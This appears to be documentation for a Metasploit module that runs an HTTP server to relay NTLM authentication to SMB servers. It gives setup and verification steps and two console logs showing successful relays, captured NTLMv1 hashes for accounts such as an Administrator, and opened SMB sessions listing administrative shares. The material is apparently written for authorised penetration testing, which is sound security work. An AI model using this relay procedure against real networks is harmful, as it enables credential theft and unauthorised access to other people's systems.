## Vulnerable Application

### Description

This module sets up an HTTP server that attempts to execute an NTLM relay attack against an SMB server on the
configured `RHOSTS`. If the relay attack is successful, an SMB session is created on the target. This session can be
used by other modules that support SMB sessions.

This module supports relaying one HTTP authentication attempt to multiple SMB servers. After attempting to relay to
one target, the relay server sends a 307 to the client and if the client is configured to respond to redirects, the
client resends the NTLMSSP_NEGOTIATE request to the relay server. Multi relay will not work if the client does not
respond to redirects.

The module supports relaying NTLM authentication which has been wrapped in GSS-SPNEGO. HTTP authentication info is sent
in the WWW-Authenticate header. In the auth header base64 encoded NTLM messages are denoted with the NTLM prefix, while
GSS wrapped NTLM messages are denoted with the Negotiate prefix. Note that in some cases non-GSS wrapped NTLM auth can
be prefixed with Negotiate.

The module also supports capturing NTLMv1 and NTLMv2 hashes.

### Setup

For this relay attack to be successful, the target SMB server must not require SMB signing. If SMB signing is required,
the relayed authentication will fail.

You can verify the target's signing configuration by using the `auxiliary/scanner/smb/smb2` module or by checking the
following registry key on the target:
```cmd
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters -v RequireSecuritySignature
```

A value of `0` means signing is not required and the relay can succeed.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/server/relay/http_to_smb`
3. Set the `RHOSTS` options
4. Run the module
5. Send an authentication attempt to the relay server
   6. `Invoke-WebRequest -Uri http://192.0.2.1/test -UseDefaultCredentials`
7. Check the output for successful relays and captured hashes

## Scenarios
### Relaying to a single SMB server
```
msf auxiliary(server/relay/http_to_smb) >
[*] Using URL: http://172.16.199.1/awauMU5svmJhX
[*] Server started.
[*] Received GET request for /test from 10.5.134.194:56167
[*] Processing request in state unauthenticated from 10.5.134.194
[*] Received GET request for /test from 10.5.134.194:56168
[*] Processing request in state unauthenticated from 10.5.134.194
[*] Received Type 1 message from 10.5.134.194, attempting to relay...
[*] Attempting to relay to 10.5.134.192:445
[*] Received type2 from target smb://10.5.134.192:445, attempting to relay back to client
[*] Received GET request for /test from 10.5.134.194:56168
[*] Processing request in state awaiting_type3 from 10.5.134.194
[*] Received Type 3 message from 10.5.134.194, attempting to relay...
[HTTP] NTLMv1-SSP Client     : 10.5.134.192
[HTTP] NTLMv1-SSP Username   : WHISTLER\Administrator
[HTTP] NTLMv1-SSP Hash       : Administrator::WHISTLER:ddfa5f067ea4a6d500000000000000000000000000000000:e2b905236443a461a0d18c8d0b636541e0590c2f7a8b2e70:927e83c8861e1ed4

[+] Identity: WHISTLER\Administrator - Successfully relayed NTLM authentication to SMB!
[+] Relay succeeded
[*] SMB session 9 opened (192.168.3.8:52959 -> 10.5.134.192:445) at 2026-06-29 12:44:07 -0700
[*] Target list exhausted for 10.5.134.194. Closing connection.

msf auxiliary(server/relay/http_to_smb) > sessions -i -1
[*] Starting interaction with 9...

SMB (10.5.134.192) > shares
Shares
======

    #  Name      Type          comment
    -  ----      ----          -------
    0  ADMIN$    DISK|SPECIAL  Remote Admin
    1  C$        DISK|SPECIAL  Default share
    2  IPC$      IPC|SPECIAL   Remote IPC
    3  NETLOGON  DISK          Logon server share
    4  SYSVOL    DISK          Logon server share

SMB (10.5.134.192) >
```

## Relaying to multiple SMB servers
```
msf auxiliary(server/relay/http_to_smb) >
[*] Using URL: http://172.16.199.1/Tqfl3zljyu
[*] Server started.
[*] Received GET request for / from 172.16.199.130:50068
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received GET request for / from 172.16.199.130:50069
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received Type 1 message from 172.16.199.130, attempting to relay...
[*] Attempting to relay to 172.16.199.201:445
[*] Received type2 from target smb://172.16.199.201:445, attempting to relay back to client
[*] Received GET request for / from 172.16.199.130:50069
[*] Processing request in state awaiting_type3 from 172.16.199.130
[*] Received Type 3 message from 172.16.199.130, attempting to relay...
[HTTP] NTLMv1-SSP Client     : 172.16.199.201
[HTTP] NTLMv1-SSP Username   : KERBEROS\sandy
[HTTP] NTLMv1-SSP Hash       : sandy::KERBEROS:0c38c494a6e41dd000000000000000000000000000000000:9d43cb96cc90dfc171c1a34bff7e6c9a2b5d0d9b1d8b537a:e551856a84be7c2b

[+] Identity: KERBEROS\sandy -  Successfully relayed NTLM authentication to SMB!
[+] Relay succeeded
[*] SMB session 3 opened (172.16.199.1:51218 -> 172.16.199.201:445) at 2026-06-29 11:06:38 -0700
[*] Moving to next target (172.16.199.200). Issuing 307 Redirect to /RRfvosEa4d
[*] Received GET request for /RRfvosEa4d from 172.16.199.130:50068
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received GET request for /RRfvosEa4d from 172.16.199.130:50070
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received Type 1 message from 172.16.199.130, attempting to relay...
[*] Attempting to relay to 172.16.199.200:445
[*] Received type2 from target smb://172.16.199.200:445, attempting to relay back to client
[*] Received GET request for /RRfvosEa4d from 172.16.199.130:50070
[*] Processing request in state awaiting_type3 from 172.16.199.130
[*] Received Type 3 message from 172.16.199.130, attempting to relay...
[HTTP] NTLMv1-SSP Client     : 172.16.199.200
[HTTP] NTLMv1-SSP Username   : KERBEROS\sandy
[HTTP] NTLMv1-SSP Hash       : sandy::KERBEROS:2f8b113a0ca1366500000000000000000000000000000000:c6a2445de2e17cd581891231a3e780e434c59cf19ae566eb:52bbfcc4c36880e1

[+] Identity: KERBEROS\sandy -  Successfully relayed NTLM authentication to SMB!
[+] Relay succeeded
[*] SMB session 4 opened (172.16.199.1:51231 -> 172.16.199.200:445) at 2026-06-29 11:06:39 -0700
[*] Target list exhausted for 172.16.199.130. Closing connection.

```